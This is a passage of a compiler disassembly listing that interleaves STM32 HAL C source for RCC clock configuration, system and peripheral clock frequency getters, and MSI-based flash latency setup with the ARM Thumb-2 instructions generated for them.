 8004232:	f241 3288 	movw	r2, #5000	; 0x1388
 8004236:	4293      	cmp	r3, r2
 8004238:	d901      	bls.n	800423e <HAL_RCC_ClockConfig+0x106>
      {
        return HAL_TIMEOUT;
 800423a:	2303      	movs	r3, #3
 800423c:	e06e      	b.n	800431c <HAL_RCC_ClockConfig+0x1e4>
    while(__HAL_RCC_GET_SYSCLK_SOURCE() != (RCC_ClkInitStruct->SYSCLKSource << RCC_CFGR_SWS_Pos))
 800423e:	4b3a      	ldr	r3, [pc, #232]	; (8004328 <HAL_RCC_ClockConfig+0x1f0>)
 8004240:	689b      	ldr	r3, [r3, #8]
 8004242:	f003 020c 	and.w	r2, r3, #12
 8004246:	687b      	ldr	r3, [r7, #4]
 8004248:	685b      	ldr	r3, [r3, #4]
 800424a:	009b      	lsls	r3, r3, #2
 800424c:	429a      	cmp	r2, r3
 800424e:	d1eb      	bne.n	8004228 <HAL_RCC_ClockConfig+0xf0>
  }
#endif

  /*----------------- HCLK Configuration after SYSCLK-------------------------*/
  /* Apply lower HCLK prescaler request here to ensure CPU clock is not of of spec when SYSCLK is set */
  if(((RCC_ClkInitStruct->ClockType) & RCC_CLOCKTYPE_HCLK) == RCC_CLOCKTYPE_HCLK)
 8004250:	687b      	ldr	r3, [r7, #4]
 8004252:	681b      	ldr	r3, [r3, #0]
 8004254:	f003 0302 	and.w	r3, r3, #2
 8004258:	2b00      	cmp	r3, #0
 800425a:	d010      	beq.n	800427e <HAL_RCC_ClockConfig+0x146>
  {
    if(RCC_ClkInitStruct->AHBCLKDivider < READ_BIT(RCC->CFGR, RCC_CFGR_HPRE))
 800425c:	687b      	ldr	r3, [r7, #4]
 800425e:	689a      	ldr	r2, [r3, #8]
 8004260:	4b31      	ldr	r3, [pc, #196]	; (8004328 <HAL_RCC_ClockConfig+0x1f0>)
 8004262:	689b      	ldr	r3, [r3, #8]
 8004264:	f003 03f0 	and.w	r3, r3, #240	; 0xf0
 8004268:	429a      	cmp	r2, r3
 800426a:	d208      	bcs.n	800427e <HAL_RCC_ClockConfig+0x146>
    {
      MODIFY_REG(RCC->CFGR, RCC_CFGR_HPRE, RCC_ClkInitStruct->AHBCLKDivider);
 800426c:	4b2e      	ldr	r3, [pc, #184]	; (8004328 <HAL_RCC_ClockConfig+0x1f0>)
 800426e:	689b      	ldr	r3, [r3, #8]
 8004270:	f023 02f0 	bic.w	r2, r3, #240	; 0xf0
 8004274:	687b      	ldr	r3, [r7, #4]
 8004276:	689b      	ldr	r3, [r3, #8]
 8004278:	492b      	ldr	r1, [pc, #172]	; (8004328 <HAL_RCC_ClockConfig+0x1f0>)
 800427a:	4313      	orrs	r3, r2
 800427c:	608b      	str	r3, [r1, #8]
    }
  }

  /* Allow decreasing of the number of wait states (because of lower CPU frequency expected) */
  if(FLatency < __HAL_FLASH_GET_LATENCY())
 800427e:	4b29      	ldr	r3, [pc, #164]	; (8004324 <HAL_RCC_ClockConfig+0x1ec>)
 8004280:	681b      	ldr	r3, [r3, #0]
 8004282:	f003 0307 	and.w	r3, r3, #7
 8004286:	683a      	ldr	r2, [r7, #0]
 8004288:	429a      	cmp	r2, r3
 800428a:	d210      	bcs.n	80042ae <HAL_RCC_ClockConfig+0x176>
  {
    /* Program the new number of wait states to the LATENCY bits in the FLASH_ACR register */
    __HAL_FLASH_SET_LATENCY(FLatency);
 800428c:	4b25      	ldr	r3, [pc, #148]	; (8004324 <HAL_RCC_ClockConfig+0x1ec>)
 800428e:	681b      	ldr	r3, [r3, #0]
 8004290:	f023 0207 	bic.w	r2, r3, #7
 8004294:	4923      	ldr	r1, [pc, #140]	; (8004324 <HAL_RCC_ClockConfig+0x1ec>)
 8004296:	683b      	ldr	r3, [r7, #0]
 8004298:	4313      	orrs	r3, r2
 800429a:	600b      	str	r3, [r1, #0]

    /* Check that the new number of wait states is taken into account to access the Flash
    memory by reading the FLASH_ACR register */
    if(__HAL_FLASH_GET_LATENCY() != FLatency)
 800429c:	4b21      	ldr	r3, [pc, #132]	; (8004324 <HAL_RCC_ClockConfig+0x1ec>)
 800429e:	681b      	ldr	r3, [r3, #0]
 80042a0:	f003 0307 	and.w	r3, r3, #7
 80042a4:	683a      	ldr	r2, [r7, #0]
 80042a6:	429a      	cmp	r2, r3
 80042a8:	d001      	beq.n	80042ae <HAL_RCC_ClockConfig+0x176>
    {
      return HAL_ERROR;
 80042aa:	2301      	movs	r3, #1
 80042ac:	e036      	b.n	800431c <HAL_RCC_ClockConfig+0x1e4>
    }
  }

  /*-------------------------- PCLK1 Configuration ---------------------------*/
  if(((RCC_ClkInitStruct->ClockType) & RCC_CLOCKTYPE_PCLK1) == RCC_CLOCKTYPE_PCLK1)
 80042ae:	687b      	ldr	r3, [r7, #4]
 80042b0:	681b      	ldr	r3, [r3, #0]
 80042b2:	f003 0304 	and.w	r3, r3, #4
 80042b6:	2b00      	cmp	r3, #0
 80042b8:	d008      	beq.n	80042cc <HAL_RCC_ClockConfig+0x194>
  {
    assert_param(IS_RCC_PCLK(RCC_ClkInitStruct->APB1CLKDivider));
    MODIFY_REG(RCC->CFGR, RCC_CFGR_PPRE1, RCC_ClkInitStruct->APB1CLKDivider);
 80042ba:	4b1b      	ldr	r3, [pc, #108]	; (8004328 <HAL_RCC_ClockConfig+0x1f0>)
 80042bc:	689b      	ldr	r3, [r3, #8]
 80042be:	f423 62e0 	bic.w	r2, r3, #1792	; 0x700
 80042c2:	687b      	ldr	r3, [r7, #4]
 80042c4:	68db      	ldr	r3, [r3, #12]
 80042c6:	4918      	ldr	r1, [pc, #96]	; (8004328 <HAL_RCC_ClockConfig+0x1f0>)
 80042c8:	4313      	orrs	r3, r2
 80042ca:	608b      	str	r3, [r1, #8]
  }

  /*-------------------------- PCLK2 Configuration ---------------------------*/
  if(((RCC_ClkInitStruct->ClockType) & RCC_CLOCKTYPE_PCLK2) == RCC_CLOCKTYPE_PCLK2)
 80042cc:	687b      	ldr	r3, [r7, #4]
 80042ce:	681b      	ldr	r3, [r3, #0]
 80042d0:	f003 0308 	and.w	r3, r3, #8
 80042d4:	2b00      	cmp	r3, #0
 80042d6:	d009      	beq.n	80042ec <HAL_RCC_ClockConfig+0x1b4>
  {
    assert_param(IS_RCC_PCLK(RCC_ClkInitStruct->APB2CLKDivider));
    MODIFY_REG(RCC->CFGR, RCC_CFGR_PPRE2, ((RCC_ClkInitStruct->APB2CLKDivider) << 3U));
 80042d8:	4b13      	ldr	r3, [pc, #76]	; (8004328 <HAL_RCC_ClockConfig+0x1f0>)
 80042da:	689b      	ldr	r3, [r3, #8]
 80042dc:	f423 5260 	bic.w	r2, r3, #14336	; 0x3800
 80042e0:	687b      	ldr	r3, [r7, #4]
 80042e2:	691b      	ldr	r3, [r3, #16]
 80042e4:	00db      	lsls	r3, r3, #3
 80042e6:	4910      	ldr	r1, [pc, #64]	; (8004328 <HAL_RCC_ClockConfig+0x1f0>)
 80042e8:	4313      	orrs	r3, r2
 80042ea:	608b      	str	r3, [r1, #8]
  }

  /* Update the SystemCoreClock global variable */
  SystemCoreClock = HAL_RCC_GetSysClockFreq() >> (AHBPrescTable[READ_BIT(RCC->CFGR, RCC_CFGR_HPRE) >> RCC_CFGR_HPRE_Pos] & 0x1FU);
 80042ec:	f000 f824 	bl	8004338 <HAL_RCC_GetSysClockFreq>
 80042f0:	4602      	mov	r2, r0
 80042f2:	4b0d      	ldr	r3, [pc, #52]	; (8004328 <HAL_RCC_ClockConfig+0x1f0>)
 80042f4:	689b      	ldr	r3, [r3, #8]
 80042f6:	091b      	lsrs	r3, r3, #4
 80042f8:	f003 030f 	and.w	r3, r3, #15
 80042fc:	490b      	ldr	r1, [pc, #44]	; (800432c <HAL_RCC_ClockConfig+0x1f4>)
 80042fe:	5ccb      	ldrb	r3, [r1, r3]
 8004300:	f003 031f 	and.w	r3, r3, #31
 8004304:	fa22 f303 	lsr.w	r3, r2, r3
 8004308:	4a09      	ldr	r2, [pc, #36]	; (8004330 <HAL_RCC_ClockConfig+0x1f8>)
 800430a:	6013      	str	r3, [r2, #0]

  /* Configure the source of time base considering new system clocks settings*/
  status = HAL_InitTick(uwTickPrio);
 800430c:	4b09      	ldr	r3, [pc, #36]	; (8004334 <HAL_RCC_ClockConfig+0x1fc>)
 800430e:	681b      	ldr	r3, [r3, #0]
 8004310:	4618      	mov	r0, r3
 8004312:	f7fc ff29 	bl	8001168 <HAL_InitTick>
 8004316:	4603      	mov	r3, r0
 8004318:	72fb      	strb	r3, [r7, #11]

  return status;
 800431a:	7afb      	ldrb	r3, [r7, #11]
}
 800431c:	4618      	mov	r0, r3
 800431e:	3710      	adds	r7, #16
 8004320:	46bd      	mov	sp, r7
 8004322:	bd80      	pop	{r7, pc}
 8004324:	40022000 	.word	0x40022000
 8004328:	40021000 	.word	0x40021000
 800432c:	0800d27c 	.word	0x0800d27c
 8004330:	20000000 	.word	0x20000000
 8004334:	20000004 	.word	0x20000004

08004338 <HAL_RCC_GetSysClockFreq>:
  *
  *
  * @retval SYSCLK frequency
  */
uint32_t HAL_RCC_GetSysClockFreq(void)
{
 8004338:	b480      	push	{r7}
 800433a:	b089      	sub	sp, #36	; 0x24
 800433c:	af00      	add	r7, sp, #0
  uint32_t msirange = 0U, sysclockfreq = 0U;
 800433e:	2300      	movs	r3, #0
 8004340:	61fb      	str	r3, [r7, #28]
 8004342:	2300      	movs	r3, #0
 8004344:	61bb      	str	r3, [r7, #24]
  uint32_t pllvco, pllsource, pllr, pllm;    /* no init needed */
  uint32_t sysclk_source, pll_oscsource;

  sysclk_source = __HAL_RCC_GET_SYSCLK_SOURCE();
 8004346:	4b3e      	ldr	r3, [pc, #248]	; (8004440 <HAL_RCC_GetSysClockFreq+0x108>)
 8004348:	689b      	ldr	r3, [r3, #8]
 800434a:	f003 030c 	and.w	r3, r3, #12
 800434e:	613b      	str	r3, [r7, #16]
  pll_oscsource = __HAL_RCC_GET_PLL_OSCSOURCE();
 8004350:	4b3b      	ldr	r3, [pc, #236]	; (8004440 <HAL_RCC_GetSysClockFreq+0x108>)
 8004352:	68db      	ldr	r3, [r3, #12]
 8004354:	f003 0303 	and.w	r3, r3, #3
 8004358:	60fb      	str	r3, [r7, #12]

  if((sysclk_source == RCC_CFGR_SWS_MSI) ||
 800435a:	693b      	ldr	r3, [r7, #16]
 800435c:	2b00      	cmp	r3, #0
 800435e:	d005      	beq.n	800436c <HAL_RCC_GetSysClockFreq+0x34>
 8004360:	693b      	ldr	r3, [r7, #16]
 8004362:	2b0c      	cmp	r3, #12
 8004364:	d121      	bne.n	80043aa <HAL_RCC_GetSysClockFreq+0x72>
     ((sysclk_source == RCC_CFGR_SWS_PLL) && (pll_oscsource == RCC_PLLSOURCE_MSI)))
 8004366:	68fb      	ldr	r3, [r7, #12]
 8004368:	2b01      	cmp	r3, #1
 800436a:	d11e      	bne.n	80043aa <HAL_RCC_GetSysClockFreq+0x72>
  {
    /* MSI or PLL with MSI source used as system clock source */

    /* Get SYSCLK source */
    if(READ_BIT(RCC->CR, RCC_CR_MSIRGSEL) == 0U)
 800436c:	4b34      	ldr	r3, [pc, #208]	; (8004440 <HAL_RCC_GetSysClockFreq+0x108>)
 800436e:	681b      	ldr	r3, [r3, #0]
 8004370:	f003 0308 	and.w	r3, r3, #8
 8004374:	2b00      	cmp	r3, #0
 8004376:	d107      	bne.n	8004388 <HAL_RCC_GetSysClockFreq+0x50>
    { /* MSISRANGE from RCC_CSR applies */
      msirange = READ_BIT(RCC->CSR, RCC_CSR_MSISRANGE) >> RCC_CSR_MSISRANGE_Pos;
 8004378:	4b31      	ldr	r3, [pc, #196]	; (8004440 <HAL_RCC_GetSysClockFreq+0x108>)
 800437a:	f8d3 3094 	ldr.w	r3, [r3, #148]	; 0x94
 800437e:	0a1b      	lsrs	r3, r3, #8
 8004380:	f003 030f 	and.w	r3, r3, #15
 8004384:	61fb      	str	r3, [r7, #28]
 8004386:	e005      	b.n	8004394 <HAL_RCC_GetSysClockFreq+0x5c>
    }
    else
    { /* MSIRANGE from RCC_CR applies */
      msirange = READ_BIT(RCC->CR, RCC_CR_MSIRANGE) >> RCC_CR_MSIRANGE_Pos;
 8004388:	4b2d      	ldr	r3, [pc, #180]	; (8004440 <HAL_RCC_GetSysClockFreq+0x108>)
 800438a:	681b      	ldr	r3, [r3, #0]
 800438c:	091b      	lsrs	r3, r3, #4
 800438e:	f003 030f 	and.w	r3, r3, #15
 8004392:	61fb      	str	r3, [r7, #28]
    }
    /*MSI frequency range in HZ*/
    msirange = MSIRangeTable[msirange];
 8004394:	4a2b      	ldr	r2, [pc, #172]	; (8004444 <HAL_RCC_GetSysClockFreq+0x10c>)
 8004396:	69fb      	ldr	r3, [r7, #28]
 8004398:	f852 3023 	ldr.w	r3, [r2, r3, lsl #2]
 800439c:	61fb      	str	r3, [r7, #28]

    if(sysclk_source == RCC_CFGR_SWS_MSI)
 800439e:	693b      	ldr	r3, [r7, #16]
 80043a0:	2b00      	cmp	r3, #0
 80043a2:	d10d      	bne.n	80043c0 <HAL_RCC_GetSysClockFreq+0x88>
    {
      /* MSI used as system clock source */
      sysclockfreq = msirange;
 80043a4:	69fb      	ldr	r3, [r7, #28]
 80043a6:	61bb      	str	r3, [r7, #24]
    if(sysclk_source == RCC_CFGR_SWS_MSI)
 80043a8:	e00a      	b.n	80043c0 <HAL_RCC_GetSysClockFreq+0x88>
    }
  }
  else if(sysclk_source == RCC_CFGR_SWS_HSI)
 80043aa:	693b      	ldr	r3, [r7, #16]
 80043ac:	2b04      	cmp	r3, #4
 80043ae:	d102      	bne.n	80043b6 <HAL_RCC_GetSysClockFreq+0x7e>
  {
    /* HSI used as system clock source */
    sysclockfreq = HSI_VALUE;
 80043b0:	4b25      	ldr	r3, [pc, #148]	; (8004448 <HAL_RCC_GetSysClockFreq+0x110>)
 80043b2:	61bb      	str	r3, [r7, #24]
 80043b4:	e004      	b.n	80043c0 <HAL_RCC_GetSysClockFreq+0x88>
  }
  else if(sysclk_source == RCC_CFGR_SWS_HSE)
 80043b6:	693b      	ldr	r3, [r7, #16]
 80043b8:	2b08      	cmp	r3, #8
 80043ba:	d101      	bne.n	80043c0 <HAL_RCC_GetSysClockFreq+0x88>
  {
    /* HSE used as system clock source */
    sysclockfreq = HSE_VALUE;
 80043bc:	4b23      	ldr	r3, [pc, #140]	; (800444c <HAL_RCC_GetSysClockFreq+0x114>)
 80043be:	61bb      	str	r3, [r7, #24]
  else
  {
    /* unexpected case: sysclockfreq at 0 */
  }

  if(sysclk_source == RCC_CFGR_SWS_PLL)
 80043c0:	693b      	ldr	r3, [r7, #16]
 80043c2:	2b0c      	cmp	r3, #12
 80043c4:	d134      	bne.n	8004430 <HAL_RCC_GetSysClockFreq+0xf8>
    /* PLL used as system clock  source */

    /* PLL_VCO = (HSE_VALUE or HSI_VALUE or MSI_VALUE) * PLLN / PLLM
    SYSCLK = PLL_VCO / PLLR
    */
    pllsource = READ_BIT(RCC->PLLCFGR, RCC_PLLCFGR_PLLSRC);
 80043c6:	4b1e      	ldr	r3, [pc, #120]	; (8004440 <HAL_RCC_GetSysClockFreq+0x108>)
 80043c8:	68db      	ldr	r3, [r3, #12]
 80043ca:	f003 0303 	and.w	r3, r3, #3
 80043ce:	60bb      	str	r3, [r7, #8]

    switch (pllsource)
 80043d0:	68bb      	ldr	r3, [r7, #8]
 80043d2:	2b02      	cmp	r3, #2
 80043d4:	d003      	beq.n	80043de <HAL_RCC_GetSysClockFreq+0xa6>
 80043d6:	68bb      	ldr	r3, [r7, #8]
 80043d8:	2b03      	cmp	r3, #3
 80043da:	d003      	beq.n	80043e4 <HAL_RCC_GetSysClockFreq+0xac>
 80043dc:	e005      	b.n	80043ea <HAL_RCC_GetSysClockFreq+0xb2>
    {
    case RCC_PLLSOURCE_HSI:  /* HSI used as PLL clock source */
      pllvco = HSI_VALUE;
 80043de:	4b1a      	ldr	r3, [pc, #104]	; (8004448 <HAL_RCC_GetSysClockFreq+0x110>)
 80043e0:	617b      	str	r3, [r7, #20]
      break;
 80043e2:	e005      	b.n	80043f0 <HAL_RCC_GetSysClockFreq+0xb8>

    case RCC_PLLSOURCE_HSE:  /* HSE used as PLL clock source */
      pllvco = HSE_VALUE;
 80043e4:	4b19      	ldr	r3, [pc, #100]	; (800444c <HAL_RCC_GetSysClockFreq+0x114>)
 80043e6:	617b      	str	r3, [r7, #20]
      break;
 80043e8:	e002      	b.n	80043f0 <HAL_RCC_GetSysClockFreq+0xb8>

    case RCC_PLLSOURCE_MSI:  /* MSI used as PLL clock source */
    default:
      pllvco = msirange;
 80043ea:	69fb      	ldr	r3, [r7, #28]
 80043ec:	617b      	str	r3, [r7, #20]
      break;
 80043ee:	bf00      	nop
    }
    pllm = (READ_BIT(RCC->PLLCFGR, RCC_PLLCFGR_PLLM) >> RCC_PLLCFGR_PLLM_Pos) + 1U ;
 80043f0:	4b13      	ldr	r3, [pc, #76]	; (8004440 <HAL_RCC_GetSysClockFreq+0x108>)
 80043f2:	68db      	ldr	r3, [r3, #12]
 80043f4:	091b      	lsrs	r3, r3, #4
 80043f6:	f003 0307 	and.w	r3, r3, #7
 80043fa:	3301      	adds	r3, #1
 80043fc:	607b      	str	r3, [r7, #4]
    pllvco = (pllvco * (READ_BIT(RCC->PLLCFGR, RCC_PLLCFGR_PLLN) >> RCC_PLLCFGR_PLLN_Pos)) / pllm;
 80043fe:	4b10      	ldr	r3, [pc, #64]	; (8004440 <HAL_RCC_GetSysClockFreq+0x108>)
 8004400:	68db      	ldr	r3, [r3, #12]
 8004402:	0a1b      	lsrs	r3, r3, #8
 8004404:	f003 037f 	and.w	r3, r3, #127	; 0x7f
 8004408:	697a      	ldr	r2, [r7, #20]
 800440a:	fb03 f202 	mul.w	r2, r3, r2
 800440e:	687b      	ldr	r3, [r7, #4]
 8004410:	fbb2 f3f3 	udiv	r3, r2, r3
 8004414:	617b      	str	r3, [r7, #20]
    pllr = ((READ_BIT(RCC->PLLCFGR, RCC_PLLCFGR_PLLR) >> RCC_PLLCFGR_PLLR_Pos) + 1U ) * 2U;
 8004416:	4b0a      	ldr	r3, [pc, #40]	; (8004440 <HAL_RCC_GetSysClockFreq+0x108>)
 8004418:	68db      	ldr	r3, [r3, #12]
 800441a:	0e5b      	lsrs	r3, r3, #25
 800441c:	f003 0303 	and.w	r3, r3, #3
 8004420:	3301      	adds	r3, #1
 8004422:	005b      	lsls	r3, r3, #1
 8004424:	603b      	str	r3, [r7, #0]
    sysclockfreq = pllvco / pllr;
 8004426:	697a      	ldr	r2, [r7, #20]
 8004428:	683b      	ldr	r3, [r7, #0]
 800442a:	fbb2 f3f3 	udiv	r3, r2, r3
 800442e:	61bb      	str	r3, [r7, #24]
  }

  return sysclockfreq;
 8004430:	69bb      	ldr	r3, [r7, #24]
}
 8004432:	4618      	mov	r0, r3
 8004434:	3724      	adds	r7, #36	; 0x24
 8004436:	46bd      	mov	sp, r7
 8004438:	f85d 7b04 	ldr.w	r7, [sp], #4
 800443c:	4770      	bx	lr
 800443e:	bf00      	nop
 8004440:	40021000 	.word	0x40021000
 8004444:	0800d294 	.word	0x0800d294
 8004448:	00f42400 	.word	0x00f42400
 800444c:	007a1200 	.word	0x007a1200

08004450 <HAL_RCC_GetHCLKFreq>:
  *
  * @note   The SystemCoreClock CMSIS variable is used to store System Clock Frequency.
  * @retval HCLK frequency in Hz
  */
uint32_t HAL_RCC_GetHCLKFreq(void)
{
 8004450:	b480      	push	{r7}
 8004452:	af00      	add	r7, sp, #0
  return SystemCoreClock;
 8004454:	4b03      	ldr	r3, [pc, #12]	; (8004464 <HAL_RCC_GetHCLKFreq+0x14>)
 8004456:	681b      	ldr	r3, [r3, #0]
}
 8004458:	4618      	mov	r0, r3
 800445a:	46bd      	mov	sp, r7
 800445c:	f85d 7b04 	ldr.w	r7, [sp], #4
 8004460:	4770      	bx	lr
 8004462:	bf00      	nop
 8004464:	20000000 	.word	0x20000000

08004468 <HAL_RCC_GetPCLK1Freq>:
  * @note   Each time PCLK1 changes, this function must be called to update the
  *         right PCLK1 value. Otherwise, any configuration based on this function will be incorrect.
  * @retval PCLK1 frequency in Hz
  */
uint32_t HAL_RCC_GetPCLK1Freq(void)
{
 8004468:	b580      	push	{r7, lr}
 800446a:	af00      	add	r7, sp, #0
  /* Get HCLK source and Compute PCLK1 frequency ---------------------------*/
  return (HAL_RCC_GetHCLKFreq() >> (APBPrescTable[READ_BIT(RCC->CFGR, RCC_CFGR_PPRE1) >> RCC_CFGR_PPRE1_Pos] & 0x1FU));
 800446c:	f7ff fff0 	bl	8004450 <HAL_RCC_GetHCLKFreq>
 8004470:	4602      	mov	r2, r0
 8004472:	4b06      	ldr	r3, [pc, #24]	; (800448c <HAL_RCC_GetPCLK1Freq+0x24>)
 8004474:	689b      	ldr	r3, [r3, #8]
 8004476:	0a1b      	lsrs	r3, r3, #8
 8004478:	f003 0307 	and.w	r3, r3, #7
 800447c:	4904      	ldr	r1, [pc, #16]	; (8004490 <HAL_RCC_GetPCLK1Freq+0x28>)
 800447e:	5ccb      	ldrb	r3, [r1, r3]
 8004480:	f003 031f 	and.w	r3, r3, #31
 8004484:	fa22 f303 	lsr.w	r3, r2, r3
}
 8004488:	4618      	mov	r0, r3
 800448a:	bd80      	pop	{r7, pc}
 800448c:	40021000 	.word	0x40021000
 8004490:	0800d28c 	.word	0x0800d28c

08004494 <HAL_RCC_GetPCLK2Freq>:
  * @note   Each time PCLK2 changes, this function must be called to update the
  *         right PCLK2 value. Otherwise, any configuration based on this function will be incorrect.
  * @retval PCLK2 frequency in Hz
  */
uint32_t HAL_RCC_GetPCLK2Freq(void)
{
 8004494:	b580      	push	{r7, lr}
 8004496:	af00      	add	r7, sp, #0
  /* Get HCLK source and Compute PCLK2 frequency ---------------------------*/
  return (HAL_RCC_GetHCLKFreq()>> (APBPrescTable[READ_BIT(RCC->CFGR, RCC_CFGR_PPRE2) >> RCC_CFGR_PPRE2_Pos] & 0x1FU));
 8004498:	f7ff ffda 	bl	8004450 <HAL_RCC_GetHCLKFreq>
 800449c:	4602      	mov	r2, r0
 800449e:	4b06      	ldr	r3, [pc, #24]	; (80044b8 <HAL_RCC_GetPCLK2Freq+0x24>)
 80044a0:	689b      	ldr	r3, [r3, #8]
 80044a2:	0adb      	lsrs	r3, r3, #11
 80044a4:	f003 0307 	and.w	r3, r3, #7
 80044a8:	4904      	ldr	r1, [pc, #16]	; (80044bc <HAL_RCC_GetPCLK2Freq+0x28>)
 80044aa:	5ccb      	ldrb	r3, [r1, r3]
 80044ac:	f003 031f 	and.w	r3, r3, #31
 80044b0:	fa22 f303 	lsr.w	r3, r2, r3
}
 80044b4:	4618      	mov	r0, r3
 80044b6:	bd80      	pop	{r7, pc}
 80044b8:	40021000 	.word	0x40021000
 80044bc:	0800d28c 	.word	0x0800d28c

080044c0 <RCC_SetFlashLatencyFromMSIRange>:
            voltage range.
  * @param  msirange  MSI range value from RCC_MSIRANGE_0 to RCC_MSIRANGE_11
  * @retval HAL status
  */
static HAL_StatusTypeDef RCC_SetFlashLatencyFromMSIRange(uint32_t msirange)
{
 80044c0:	b580      	push	{r7, lr}
 80044c2:	b086      	sub	sp, #24
 80044c4:	af00      	add	r7, sp, #0
 80044c6:	6078      	str	r0, [r7, #4]
  uint32_t vos;
  uint32_t latency = FLASH_LATENCY_0;  /* default value 0WS */
 80044c8:	2300      	movs	r3, #0
 80044ca:	613b      	str	r3, [r7, #16]

  if(__HAL_RCC_PWR_IS_CLK_ENABLED())
 80044cc:	4b2a      	ldr	r3, [pc, #168]	; (8004578 <RCC_SetFlashLatencyFromMSIRange+0xb8>)
 80044ce:	6d9b      	ldr	r3, [r3, #88]	; 0x58
 80044d0:	f003 5380 	and.w	r3, r3, #268435456	; 0x10000000
 80044d4:	2b00      	cmp	r3, #0
 80044d6:	d003      	beq.n	80044e0 <RCC_SetFlashLatencyFromMSIRange+0x20>
  {
    vos = HAL_PWREx_GetVoltageRange();
 80044d8:	f7ff f9a6 	bl	8003828 <HAL_PWREx_GetVoltageRange>
 80044dc:	6178      	str	r0, [r7, #20]
 80044de:	e014      	b.n	800450a <RCC_SetFlashLatencyFromMSIRange+0x4a>
  }
  else
  {
    __HAL_RCC_PWR_CLK_ENABLE();
 80044e0:	4b25      	ldr	r3, [pc, #148]	; (8004578 <RCC_SetFlashLatencyFromMSIRange+0xb8>)
 80044e2:	6d9b      	ldr	r3, [r3, #88]	; 0x58
 80044e4:	4a24      	ldr	r2, [pc, #144]	; (8004578 <RCC_SetFlashLatencyFromMSIRange+0xb8>)
 80044e6:	f043 5380 	orr.w	r3, r3, #268435456	; 0x10000000
 80044ea:	6593      	str	r3, [r2, #88]	; 0x58
 80044ec:	4b22      	ldr	r3, [pc, #136]	; (8004578 <RCC_SetFlashLatencyFromMSIRange+0xb8>)
 80044ee:	6d9b      	ldr	r3, [r3, #88]	; 0x58
 80044f0:	f003 5380 	and.w	r3, r3, #268435456	; 0x10000000
 80044f4:	60fb      	str	r3, [r7, #12]
 80044f6:	68fb      	ldr	r3, [r7, #12]
    vos = HAL_PWREx_GetVoltageRange();
 80044f8:	f7ff f996 	bl	8003828 <HAL_PWREx_GetVoltageRange>
 80044fc:	6178      	str	r0, [r7, #20]
    __HAL_RCC_PWR_CLK_DISABLE();
 80044fe:	4b1e      	ldr	r3, [pc, #120]	; (8004578 <RCC_SetFlashLatencyFromMSIRange+0xb8>)
 8004500:	6d9b      	ldr	r3, [r3, #88]	; 0x58
 8004502:	4a1d      	ldr	r2, [pc, #116]	; (8004578 <RCC_SetFlashLatencyFromMSIRange+0xb8>)
 8004504:	f023 5380 	bic.w	r3, r3, #268435456	; 0x10000000
 8004508:	6593      	str	r3, [r2, #88]	; 0x58
  }

  if(vos == PWR_REGULATOR_VOLTAGE_SCALE1)
 800450a:	697b      	ldr	r3, [r7, #20]
 800450c:	f5b3 7f00 	cmp.w	r3, #512	; 0x200
 8004510:	d10b      	bne.n	800452a <RCC_SetFlashLatencyFromMSIRange+0x6a>
  {
    if(msirange > RCC_MSIRANGE_8)
 8004512:	687b      	ldr	r3, [r7, #4]
 8004514:	2b80      	cmp	r3, #128	; 0x80
 8004516:	d919      	bls.n	800454c <RCC_SetFlashLatencyFromMSIRange+0x8c>
    {
      /* MSI > 16Mhz */
      if(msirange > RCC_MSIRANGE_10)
 8004518:	687b      	ldr	r3, [r7, #4]
 800451a:	2ba0      	cmp	r3, #160	; 0xa0
 800451c:	d902      	bls.n	8004524 <RCC_SetFlashLatencyFromMSIRange+0x64>
      {
        /* MSI 48Mhz */
        latency = FLASH_LATENCY_2; /* 2WS */
 800451e:	2302      	movs	r3, #2
 8004520:	613b      	str	r3, [r7, #16]
 8004522:	e013      	b.n	800454c <RCC_SetFlashLatencyFromMSIRange+0x8c>
      }
      else
      {
        /* MSI 24Mhz or 32Mhz */
        latency = FLASH_LATENCY_1; /* 1WS */
 8004524:	2301      	movs	r3, #1
 8004526:	613b      	str	r3, [r7, #16]
 8004528:	e010      	b.n	800454c <RCC_SetFlashLatencyFromMSIRange+0x8c>
        latency = FLASH_LATENCY_1; /* 1WS */
      }
      /* else MSI < 8Mhz default FLASH_LATENCY_0 0WS */
    }
#else
    if(msirange > RCC_MSIRANGE_8)
 800452a:	687b      	ldr	r3, [r7, #4]
 800452c:	2b80      	cmp	r3, #128	; 0x80
 800452e:	d902      	bls.n	8004536 <RCC_SetFlashLatencyFromMSIRange+0x76>
    {
      /* MSI > 16Mhz */
      latency = FLASH_LATENCY_3; /* 3WS */
 8004530:	2303      	movs	r3, #3
 8004532:	613b      	str	r3, [r7, #16]
 8004534:	e00a      	b.n	800454c <RCC_SetFlashLatencyFromMSIRange+0x8c>
    }
    else
    {
      if(msirange == RCC_MSIRANGE_8)
 8004536:	687b      	ldr	r3, [r7, #4]
 8004538:	2b80      	cmp	r3, #128	; 0x80
 800453a:	d102      	bne.n	8004542 <RCC_SetFlashLatencyFromMSIRange+0x82>
      {
        /* MSI 16Mhz */
        latency = FLASH_LATENCY_2; /* 2WS */
 800453c:	2302      	movs	r3, #2
 800453e:	613b      	str	r3, [r7, #16]
 8004540:	e004      	b.n	800454c <RCC_SetFlashLatencyFromMSIRange+0x8c>
      }
      else if(msirange == RCC_MSIRANGE_7)
 8004542:	687b      	ldr	r3, [r7, #4]
 8004544:	2b70      	cmp	r3, #112	; 0x70
 8004546:	d101      	bne.n	800454c <RCC_SetFlashLatencyFromMSIRange+0x8c>
      {
        /* MSI 8Mhz */
        latency = FLASH_LATENCY_1; /* 1WS */
 8004548:	2301      	movs	r3, #1
 800454a:	613b      	str	r3, [r7, #16]
      /* else MSI < 8Mhz default FLASH_LATENCY_0 0WS */
    }
#endif
  }

  __HAL_FLASH_SET_LATENCY(latency);
 800454c:	4b0b      	ldr	r3, [pc, #44]	; (800457c <RCC_SetFlashLatencyFromMSIRange+0xbc>)
 800454e:	681b      	ldr	r3, [r3, #0]
 8004550:	f023 0207 	bic.w	r2, r3, #7
 8004554:	4909      	ldr	r1, [pc, #36]	; (800457c <RCC_SetFlashLatencyFromMSIRange+0xbc>)
 8004556:	693b      	ldr	r3, [r7, #16]
 8004558:	4313      	orrs	r3, r2
 800455a:	600b      	str	r3, [r1, #0]

  /* Check that the new number of wait states is taken into account to access the Flash
     memory by reading the FLASH_ACR register */
  if(__HAL_FLASH_GET_LATENCY() != latency)
 800455c:	4b07      	ldr	r3, [pc, #28]	; (800457c <RCC_SetFlashLatencyFromMSIRange+0xbc>)
 800455e:	681b      	ldr	r3, [r3, #0]
 8004560:	f003 0307 	and.w	r3, r3, #7
 8004564:	693a      	ldr	r2, [r7, #16]
 8004566:	429a      	cmp	r2, r3
